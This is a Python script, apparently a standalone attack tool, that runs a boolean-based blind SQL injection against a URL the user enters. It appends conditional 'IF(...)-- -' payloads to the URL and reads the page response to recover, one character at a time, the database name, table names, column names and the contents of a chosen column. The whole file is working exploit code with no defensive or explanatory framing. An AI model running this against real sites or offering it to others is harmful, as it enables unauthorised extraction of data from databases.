import requests

def check_payload(payload):
    target_url = Site_URL+payload
    res = requests.get(url=target_url)
    if "Results have been found" in res.text:
        return True
    return False

def extract_dbs():
    dbs_name = ""
    print("[+] Getting Database length")
    for i in range(1,50):
        if check_payload(f"'and 1=IF(length(database())={i},1,0)-- -") == True:
            dbs_len = i
            print(f"[+] Database length is : {dbs_len}")
            break
    print("[+] Getting Database name ")
    print("[+] Database name : ",end="",flush=True)
    for i in range(1,dbs_len+1):
        for asc in range(33,127):
            if check_payload(f"'and 1=IF(substring(database(),{i},1)=\"{chr(asc)}\",1,0)-- -") == True:
                print(chr(asc),end="")
                dbs_name += chr(asc)
                break
    return dbs_name

def extract_tbl():
    tables = []
    print("\n[+] Getting tables Count ...")
    for i in range(1,100):
        if check_payload(f"'and 1=IF((SELECT count(*) AS TOTALNUMBEROFTABLES FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database())={i},1,0)-- -") == True:
            print(f"[+] Tables count is : {i}")
            tbl_count = i
            break
    count=0
    print(f"[+] Getting Tables Length")
    print("[+] Getting Tables name ")
    while count<tbl_count:
        table_name=""
        for i in range(1,100):
            if check_payload(f"' and 1=IF((select length(table_name) from information_schema.tables where table_schema=database() limit {count},1)={i},1,0)-- -") == True:
                tbl_len = i
                break
        if count==0:
            print(f"[+] Tables name : ",end="",flush=True)
        for i in range(1,tbl_len+1):
            for asc in range(33,127):
                if check_payload(f"' and 1=IF(substring((select table_name from information_schema.tables where table_schema=database() limit {count},1),{i},1)=\"{chr(asc)}\",1,0)-- -") == True:
                    print(chr(asc),end="")
                    table_name += chr(asc)
                    break
        tables.append(table_name.lower())
        print(",",end="")
        count +=1
    print(f"\n[+] Tables : {tables}")
    return tables
    
def extract_column(Table_name,Database):
    columns = []
    print("[+] Getting Columns Count ...")
    for i in range(1,100):
        if check_payload(f"' and 1=IF((SELECT count(*) AS TOTALNUMBEROFCOLUMNS FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{Database}' and table_name='{Table_name}')={i},1,0)-- -") ==True:
            print(f"[+] Columns count is : {i}")
            column_count = i
            break
    count=0
    print(f"[+] Getting Columns Length")
    print("[+] Getting Columns name ")
    while count<column_count:
        column_name=""
        for i in range(1,100):
            if check_payload(f"' and 1=IF((select length(column_name) from information_schema.columns where table_schema='{Database}' and table_name='{Table_name}' limit {count},1)={i},1,0)-- -") == True:
                column_len = i
                break
        if count==0:
            print(f"[+] Column name : ",end="",flush=True)
        for i in range(1,column_len+1):
            for asc in range(33,127):
                if check_payload(f"' and 1=IF(substring((select column_name from information_schema.columns where table_schema='{Database}' and table_name='{Table_name}' limit {count},1),{i},1)='{chr(asc)}',1,0)-- -") == True:
                    print(chr(asc),end="")
                    column_name += chr(asc)
                    break
        columns.append(column_name.lower())
        print(",",end="")
        count +=1
    print(f"\n[+] columns : {columns}")
    return columns

def extract_data(column,table):
    Data=""
    print("[+] Getting Data Length")
    for i in range(1,100):
        if check_payload(f"' and 1=IF(LENGTH((select {column.lower()} from {table.lower()} limit 0,1))={i},1,0)-- -") == True:
            data_len = i
            print(f"[+] Data length is : {data_len}")
            break
    print(f"[+] Data is {Data}",end="",flush=True)
    for i in range(1,data_len+1):
        for asc in range(33,127):
            if check_payload(f"' and 1=IF(substring((select {column.lower()} from {table.lower()} limit 0,1),{i},1)='{chr(asc)}',1,0)-- -") == True:
                print(chr(asc),end="")
                Data += chr(asc)
                break
try:
    Site_URL = input("Enter URL : ")
    DatabaseName = extract_dbs().lower()
    TablesList = extract_tbl()
    SelectTable = input("[+] Please Choose one Table to extract Columns : ")
    if SelectTable.lower() in TablesList:
        ColumnsList = extract_column(SelectTable,DatabaseName)
        ColumnName = input("[+] Which column do you want to extract data from it? ")
        if ColumnName.lower() in ColumnsList:
            extract_data(ColumnName,SelectTable)
            print("\n")
        else:
            print("Error - This column Does not exist ! ")
    else:
        print("Error - This table Does not exist !")

except KeyboardInterrupt:
    print("Exiting")
except:
    print("Error Something Went wrong [Bad URL] / Check your internet Connection and try again.")